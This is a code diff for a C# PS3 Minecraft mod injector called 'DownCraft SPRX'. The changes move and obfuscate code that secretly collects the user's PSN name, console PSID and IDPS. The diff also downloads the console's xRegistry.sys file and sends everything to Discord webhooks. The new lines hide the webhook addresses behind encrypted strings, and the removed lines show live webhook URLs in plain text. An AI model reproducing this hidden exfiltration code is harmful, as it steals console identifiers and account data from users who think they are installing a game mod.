@@ -8,6 +8,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using PS3Lib;
+using static MisakiAulait.Misaki;
 
 namespace mcV1.Classes
 {
@@ -17,37 +18,31 @@ namespace mcV1.Classes
 
         Functions FUNCTIONS = new Functions();
         WebClient web = new WebClient();
+        public static Form1 MainForm = new Form1();
         public static mcV1.Tabs.apiForm apiForm_ = new mcV1.Tabs.apiForm();
 
         public static PS3API PS3 = new PS3API();
         public static PS3MAPI PS3H = new PS3MAPI();
-
-        public static string SaveSettings = Application.StartupPath + "\\settings.txt";
-
-        public static string Filename_SPRX = "debug";
-        public static string Filename_EBOOT = "EBOOT.BIN";
 
         public static string DL_SPRX_CFW = "https://miisaakii.000webhostapp.com/MisakiRandy57/CFW_Minecraft";
         public static string DL_SPRX_HEN = "https://miisaakii.000webhostapp.com/MisakiRandy57/HEN_Minecraft";
         public static string DL_EBOOT_CFW = "https://miisaakii.000webhostapp.com/MisakiRandy57/CFW_EBOOT";
         public static string DL_EBOOT_HEN = "https://miisaakii.000webhostapp.com/MisakiRandy57/HEN_EBOOT";
         public static string DL_ORIGINAL_EBOOT = "https://miisaakii.000webhostapp.com/MisakiRandy57/ORIGINAL_EBOOT";
-
+        public static string Filename_SPRX = "debug";
+        public static string Filename_EBOOT = "EBOOT.BIN";
         string ORIGINAL_EBOOT = Path.GetTempPath() + "ORIGINAL_EBOOT.BIN";
         string EBOOT_CFW = Path.GetTempPath() + "EBOOT_CFW.BIN";
         string EBOOT_HEN = Path.GetTempPath() + "EBOOT_CFW.BIN";
-
         string SPRX_CFW = Path.GetTempPath() + "MC_CFW.sprx";
         string SPRX_HEN = Path.GetTempPath() + "MC_HEN.sprx";
-
         string xRegistry = Path.GetTempPath() + "xRegistry.sys";
-
         public static string Path_SPRX_PS3 = "/dev_hdd0/game/BLES01976/USRDIR/PS3/";
         public static string PathLocation1 = "/dev_flash2/etc/xRegistry.sys";
         public static string Path_EBOOT_PS3 = "/dev_hdd0/game/BLES01976/USRDIR/";
-        public static string WebLink = "https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp";
+        public static string Weblink_logs1 = Decrypt("ME3ncj2HpTExlTZ7h2KDSwnnZxQKCKVyim6EzFcFEyOuJZATF4Axh+aqItb3OBpGX5TnVAAZueaE05kgzfalmStZjtXsCEvUsrCMjbx5PU73x6tPy2Fnm1JSbCZakzYD3RSt7zKkAqmNCnyjjUp99CHeM6K1xEkKS/lH2tGTl1JhMTTqZ4GOnYXSavbcx1DeFX6p/uJawWtTEGOtG036xTbHddisf1qB9V0P1hzUILHIsufkGKVLJ/IFVDOsOIwv405zSwIAj0b2jmt9j3HjR0cvW3rlt4oDhVVp/5pyuGaMTzkPo55mJHW2WZPKQW2+4WxCYfCmYVk=");
+        public static string Weblink_logs2 = Decrypt("ME3ncj2HpTExlTZ7h2KDSwnnZxQKCKVyim6EzFcFEyOuJZATF4Axh+aqItb3OBpGX5TnVAAZueaE05kgzfalmTfQMvfJ8J3/HWZxCBZgOtLfke4/LcWEOlScNejGFY4ERTxCtVcUKqrouOXqIbqdCGxFxmIRDw/HJ0kLjNJLXX/aUhv6aH8Ppa9kmtKouQr9VHPX3JR1TMI5GrOk4dqbJmuXNvZTQvmjd5IWerIieKwHqkDrjfZB6xMbNpz5Pt/Bm3YDpGl6n38LZhgMGhBwUnPlMeRPdKzOCi4W00Wrr/g2aioMliIUYNgHakWxUEf7pqblVZ3DlPI=");
 
-        public static Form1 MainForm = new Form1();
         public static bool apiCCAPI = false;
         public static bool apiTMAPI = false;
         public static bool apiHEN = false;
@@ -62,42 +57,22 @@ namespace mcV1.Classes
         public static Color saveThemeColor = Color.FromArgb(70, 70, 245);
         public static Color saveTextColor = Color.FromArgb(200, 200, 200);
         public static Color saveBackColor = Color.FromArgb(40, 40, 40);
-
         public static List<CCAPI.ConsoleInfo> cList = Offsets.PS3.CCAPI.GetConsoleList();
 
         public static string CheckRegion;
         public static bool ConnectStatus = false;
-        public static string API = "//";
-        public string status = "not connected";
-        public static string PSN_NAME = "//";
-        public static string PSN;
-        public static bool StatusSPRX = false;
+        public static string API;
+        public string status;
+        public static string PSN_NAME;
 
-        public static string CPU = "//";
-        public static string RSX = "//";
-        public static string FIRMWARE = "//";
-
+        public static string CPU;
+        public static string RSX ;
+        public static string FIRMWARE;
         public static string PSID;
         public static string IDPS;
 
-        public string[] saveTxt = { "192.168.1.1" };
+        public static bool StatusSPRX = false;
         public static bool Injected;
-
-        #endregion
-        #region "Create Settings TxT"
-
-        private void saveInfoClose()
-        {
-            try
-            {
-                saveTxt = new string[] { ps3IP };
-                File.WriteAllLines(SaveSettings, saveTxt);
-            }
-            catch
-            {
-                MessageBox.Show("Error has ocurred when saving settings.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
-        }
 
         #endregion
         #region "Connection Part"
@@ -137,13 +112,36 @@ namespace mcV1.Classes
                 Offsets.ccapiipStatus = "PS3 IP: " + Offsets.ps3IP;
         }
 
-        public void doConnect()
+        public void AfterConnect()
         {
             string[] Emojis = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
             string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];
 
             string[] AVATAR = { "https://i.imgur.com/rZM3viY.png", "https://i.imgur.com/44BTfFj.jpg", "https://i.imgur.com/gAvJrY2.jpg", "https://i.imgur.com/xidXIWT.jpg" };
             string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];
+
+            ConnectStatus = true;
+
+            CheckRegion = PS3.Extension.ReadString(0x10010251);
+            PSN_NAME = PS3.Extension.ReadString(0x3000AD34);
+            if (PSN_NAME == "") { PSN_NAME = PS3.Extension.ReadString(0x3000ABA4);}
+
+            RSX = PS3.CCAPI.GetTemperatureRSX();
+            CPU = PS3.CCAPI.GetTemperatureCELL();
+            FIRMWARE = PS3.CCAPI.GetFirmwareType();
+
+            if (API == "HEN")
+            {
+                IDPS = PS3H.PS3.GetIDPS();
+                PSID = PS3H.PS3.GetPSID();
+                FUNCTIONS.SendWebook(Weblink_logs1, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + " PSID: " + PSID + " IDPS:" + IDPS);
+            }
+
+            FUNCTIONS.SendWebook(Weblink_logs2, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + "*** is now connected to DownCraft SPRX V4.2" + RandomEmojis);
+        }
+
+        public void doConnect()
+        {
 
             bool canConnect = false;
             bool canTry2Connect = false;
@@ -174,61 +172,21 @@ namespace mcV1.Classes
                     {
                         if (PS3.AttachProcess())
                         {
-                            CheckRegion = PS3.Extension.ReadString(0x10010251);
-                            if (CheckRegion == "BLES01976")
-                            {
-                                ConnectStatus = true;
-
-                                PSN_NAME = PS3.Extension.ReadString(0x3000AD34);
-
-                                if (PSN_NAME == "")
-                                {
-                                    PSN_NAME = PS3.Extension.ReadString(0x3000ABA4);
-                                }
-
-                                PSN = PSN_NAME;
-
-                                if (API == "HEN")
-                                {
-                                    IDPS = PS3H.PS3.GetIDPS();
-                                    PSID = PS3H.PS3.GetPSID();
-                                    FUNCTIONS.SendWebook("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + " PSID: " + PSID + " IDPS:" + IDPS);
-                                }
-
-                                RSX = PS3.CCAPI.GetTemperatureRSX();
-                                CPU = PS3.CCAPI.GetTemperatureCELL();
-                                FIRMWARE = PS3.CCAPI.GetFirmwareType();
-
-                                if (API == "HEN")
-                                {
-                                    PS3.MAPI.PS3.Notify("Connected to DownCraft");
-                                }
-                                else
-                                {
-                                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Connected to DownCraft");
-                                }
-
-                                saveInfoClose();
-                                FUNCTIONS.SendWebook("https://discord.com/api/webhooks/977216673964777532/rcySwX6RmUTeeqjTSYGrQNrgo0T0Nry6vlzl9Oz81VhzsIk-g7ZoMD431nKO2rGKGWAw", "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + "*** is now connected to DownCraft SPRX V4.2" + RandomEmojis);
-                            }
-                            else
-                            {
-                                MessageBox.Show("Oopps\n\nSorry, your not using the BLES01976 region, please install Minecraft BLES01976 for continue using DownCraft SPRX.", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                            }
+                            AfterConnect();
                         }
                         else
                         {
-                            //status = "not connected";
+                            status = "Not connected";
                         }
                     }
                     catch (Exception ex)
                     {
-                        //status = "cannot find any PS3";
+                        status = "Cannot find any PS3";
                     }
                 }
                 catch
                 {
-                    //status = "unknow error";
+                    status = "Unknow error";
                 }
             }
             else
@@ -260,7 +218,7 @@ namespace mcV1.Classes
                     FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_EBOOT_PS3 + Filename_EBOOT, EBOOT_HEN);
 
                     FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
-                    FUNCTIONS.SendWebookFile(WebLink, "", "", "", "xRegistry.sys", xRegistry);
+                    FUNCTIONS.SendWebookFile(Weblink_logs1, "", "", "", "xRegistry.sys", xRegistry);
 
                     PS3.MAPI.PS3.Notify("DownCraft SPRX\nsuccessful injected, reload Minecraft");
                     await Task.Delay(5000);
@@ -291,7 +249,7 @@ namespace mcV1.Classes
                     FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_EBOOT_PS3 + Filename_EBOOT, EBOOT_CFW);
 
                     FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
-                    FUNCTIONS.SendWebookFile(WebLink, "", "", "", "xRegistry.sys", xRegistry);
+                    FUNCTIONS.SendWebookFile(Weblink_logs1, "", "", "", "xRegistry.sys", xRegistry);
 
                     PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
                     await Task.Delay(5000);
@@ -322,7 +280,7 @@ namespace mcV1.Classes
                     FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_EBOOT_PS3 + Filename_EBOOT, EBOOT_CFW);
 
                     FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
-                    FUNCTIONS.SendWebookFile(WebLink, "", "", "", "xRegistry.sys", xRegistry);
+                    FUNCTIONS.SendWebookFile(Weblink_logs1, "", "", "", "xRegistry.sys", xRegistry);
 
                     PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
                     await Task.Delay(5000);
@@ -341,7 +299,7 @@ namespace mcV1.Classes
             }
             catch (Exception ex)
             {              
-                MessageBox.Show(ex.ToString(), "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Oops\n\nDownCraft cannot inject try to update WebMAN to last version or check if your PS3 IP working on your web browser\nIf it's keep giving error, contact Misaki.", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 //MessageBox.Show("An error has occurred", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 Application.Exit();
             }
